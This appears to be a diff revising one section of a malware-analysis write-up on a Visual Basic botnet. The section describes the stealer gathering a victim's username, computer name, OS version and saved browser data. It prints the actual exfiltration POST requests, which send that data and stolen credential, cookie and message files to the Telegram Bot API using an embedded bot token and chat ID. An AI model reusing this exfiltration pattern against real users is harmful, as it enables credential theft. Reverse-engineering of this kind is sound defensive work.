@@ -502,38 +502,42 @@ Main function:
 
 # Part-8: Back to DL_NATIVE_BOTNET1209
 
-After executing ThunderFox in `sub_4640c4`, the botnet binary loops the `sub_4661f1` 0x1f4 times. After that, it generates and modifies a few strings. If you go further into the program, in the function `sub_46464c`, it takes '79A4261B3FC61BA985DE6FE5C1C0B925' and passes it as an argument to `sub_46853c`, which returns BSTR('79A4261B3FC61BA985DE6FE5C1C0B925'). The returned value and 'ZiZRcjBKvueDrxRVSwAlfpuyMusWECie' are then passed as arguments to `sub_468D3a`, which returns '\credentials.txt'. This string is added to the end of "C:\Users\IEUser\AppData\Roaming\Microsoft\Windows\Templates", and we get the path ("C:\Users\IEUser\AppData\Roaming\Microsoft\Windows\Templates\credentials.txt") to the file generated in ThunderFox. The functions `sub_46853c` and `sub_468D3a` are used to extract the current date and time, username, computer name, and Windows version.
+After executing ThunderFox in `sub_4640c4`, the botnet binary loops the `sub_4661f1` 0x1f4 times.
 
+Upon exiting the loop, it calls the function `sub_46464c`, passing '79A4261B3FC61BA985DE6FE5C1C0B925' as an argument to `sub_46853c`, which returns BSTR('79A4261B3FC61BA985DE6FE5C1C0B925'). The returned value and 'ZiZRcjBKvueDrxRVSwAlfpuyMusWECie' are then passed as arguments to `sub_468D3a`, which returns '\credentials.txt'. This string is added to the end of "C:\Users\IEUser\AppData\Roaming\Microsoft\Windows\Templates", and we get the path ("C:\Users\IEUser\AppData\Roaming\Microsoft\Windows\Templates\credentials.txt") to the file generated in ThunderFox. The `scrrun.730A6560` function is called, which is a Microsoft Scripting Runtime library function. It takes the credentials path as argument.
+
+Next, It then calls `sub_46798c`: 
+- It uses the `MSVBVM60.Dim` and `MSVBVM60.Environ` functions to extract the current date and time, username, and computer name.
+- It retrieves the Windows version using the function `sub_467e80`.
+- Furthermore, it determines the processor type using the function `sub_46821b`.
 ![](https://i.imgur.com/1kQJsIf.png)
 
-This generates the bot ID that sends the message.
-
+As the function continues, it performs string concatenation of `vbCrLf` blocks for new line. At address `0x464c6f` it calls `sub_4665c6`.
+The function `sub_4665c6` performs:
+- Generates the bot token.
 ![](https://i.imgur.com/IYo5eL7.png)
 
-This generates the chat ID.
-
+- Generates the chat ID.
 ![](https://i.imgur.com/ELXCECp.png)
 
-The saved data from `credential.txt` is concatenated after 'Passwords', but as we don't have any credentials stored in Chrome or any other browser, it shows as 'Passwords:::MSEDGEWIN10\IEUser'.
-
+- It jumps to the address `0x466cd4`, which uses `wdigest.dll` for digest authentication.
 ![](https://i.imgur.com/eXp4vQm.png)
 
-It uses the following request:
+- Following authentication, it creates an object of `MSXML2.ServerXMLHTTP.6.0` to perform HTTP requests. It sends the following POST request:
+  ```
+  POST
+  https://api.telegram.org/bot5797428905:AAGaRRXGZN1d9GGFd3sE5x4uSpCGF0PU4m4/sendMessage?text=Passwords:::MSEDGEWIN10\IEUser
+  Date: 06/19/2023 10:50:45 AM
+  Username: IEUser
+  CompName: MSEDGEWIN10
+  Windows Version: Windows 8/10 - 64-bit
+  &chat_id=1251788325
+  ```
+- Then request headers are set, and the request is sent at the address `0x467183`.
 
-```
-POST
-https://api.telegram.org/bot5797428905:AAGaRRXGZN1d9GGFd3sE5x4uSpCGF0PU4m4/sendMessage?text=Passwords:::MSEDGEWIN10\IEUser
-Date: 06/19/2023 10:50:45 AM
-Username: IEUser
-CompName: MSEDGEWIN10
-Windows Version: Windows 8/10 - 64-bit
-&chat_id=1251788325
-```
+Similar steps are followed to send documents such as credentials.txt, Cookies{browsername}.txt, Messages{browsername}.txt, and Contacts{browser.txt}.
 
-The same steps are used to send documents like Cookies{browsername}.txt, Messages{browsername}.txt, and Contacts{browser.txt}.
-
-The request:
-
+The POST request sent for documents is as follows:
 ```
 POST
 https://api.telegram.org/bot5797428905:AAGaRRXGZN1d9GGFd3sE5x4uSpCGF0PU4m4/sendDocument?chat_id=1251788325&caption=$caption&document=$PATH
